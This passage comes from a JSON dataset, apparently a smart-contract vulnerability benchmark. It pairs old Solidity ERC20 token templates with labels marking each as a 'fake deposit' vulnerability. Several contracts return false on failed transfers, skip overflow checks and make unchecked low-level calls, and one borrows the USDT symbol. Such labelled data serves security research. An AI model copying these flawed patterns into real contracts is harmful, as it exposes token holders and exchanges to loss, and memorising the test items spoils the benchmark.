payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Dalgona\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"DALGONA\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000;                        // Update total supply (100000 for example)\r\n        name = \"HellBound Coin\";                                   // Set the name for display purposes\r\n        decimals = 4;                            // Amount of decimals for display purposes\r\n        symbol = \"HBC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract BretCoin is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name = 'BretCoin';                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals = 10;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol = 'BRET';                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function BretCoin(\r\n        ) {\r\n        balances[msg.sender] = 210000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 210000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"BretCoin\";                                   // Set the name for display purposes\r\n        decimals = 10;                            // Amount of decimals for display purposes\r\n        symbol = \"BRET\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\ncontract AtlasTether {\r\n/// @return total amount of tokens\r\n function totalSupply() constant returns (uint256 supply) {}\r\n/// @param _owner The address from which the balance will be retrieved\r\n /// @return The balance\r\n function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transfer(address _to, uint256 _value) returns (bool success) {}\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n /// @param _from The address of the sender\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @param _value The amount of wei to be approved for transfer\r\n /// @return Whether the approval was successful or not\r\n function approve(address _spender, uint256 _value) returns (bool success) {}\r\n/// @param _owner The address of the account owning tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @return Amount of remaining tokens allowed to spent\r\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n \r\n}\r\ncontract StandardToken is AtlasTether {\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\r\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\r\n //Replace the if with this one instead.\r\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[msg.sender] >= _value && _value > 0) {\r\n balances[msg.sender] -= _value;\r\n balances[_to] += _value;\r\n Transfer(msg.sender, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n balances[_to] += _value;\r\n balances[_from] -= _value;\r\n allowed[_from][msg.sender] -= _value;\r\n Transfer(_from, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n return balances[_owner];\r\n }\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n return true;\r\n }\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n return allowed[_owner][_spender];\r\n }\r\nmapping (address => uint256) balances;\r\n mapping (address => mapping (address => uint256)) allowed;\r\n uint256 public totalSupply;\r\n}\r\n//name this contract whatever you\u2019d like\r\ncontract Token is StandardToken {\r\nfunction () {\r\n //if ether is sent to this address, send it back.\r\n throw;\r\n }\r\n/* Public variables of the token */\r\n/*\r\n NOTE:\r\n The following variables are OPTIONAL vanities. One does not have to include them.\r\n They allow one to customise the token contract & in no way influences the core functionality.\r\n Some wallets/interfaces might not even bother to look at this information.\r\n */\r\n string public name; //fancy name: eg Simon Bucks\r\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It\u2019s like comparing 1 wei to 1 ether.\r\n string public symbol; //An identifier: eg SBX\r\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n//\r\n// \u0628\u0631\u0627\u06cc \u062a\u0648\u06a9\u0646 \u062e\u0648\u062f \u0645\u0642\u062f\u0627\u0631\u0647\u0627\u06cc \u0632\u06cc\u0631 \u0631\u0627 \u062a\u063a\u06cc\u06cc\u0631 \u062f\u0647\u06cc\u062f\r\n//\r\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\nfunction Token(\r\n ) {\r\n balances[msg.sender] = 100000; // \u062a\u0645\u0627\u0645 \u062a\u0648\u06a9\u0646\u0647\u0627\u06cc \u0633\u0627\u062e\u062a\u0647 \u0634\u062f\u0647 \u0633\u0627\u0632\u0646\u062f\u0647 \u0628\u0631\u0633\u062f -\u0639\u062f\u062f\u06cc \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f \u0645\u062b\u0644\u0627 100000\r\n totalSupply = 1000000000; // \u062a\u0645\u0627\u0645 \u0639\u0631\u0636\u0647\r\n name = 'AtlasTether'; // \u0646\u0627\u0645 \u062a\u0648\u06a9\u0646\r\n decimals = 2; // \u0627\u0639\u0634\u0627\u0631\r\n symbol = 'USDT'; // \u0646\u0645\u0627\u062f \u062a\u0648\u06a9\u0646\r\n }\r\n/* Approves and then calls the receiving contract */\r\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\r\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n if(!_spender.call(bytes4(bytes32(sha3('receiveApproval(address,uint256,address,bytes)'))), msg.sender, _value, this, _extraData)) { throw; }\r\n return true;\r\n }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 50000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 50000;                        // Update total supply (100000 for example)\r\n        name = \"RadioInternacional.tv\";                                   // Set the name for display purposes\r\n        decimals = 0;                            // Amount of decimals for display purposes\r\n        symbol = \"RITV\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n   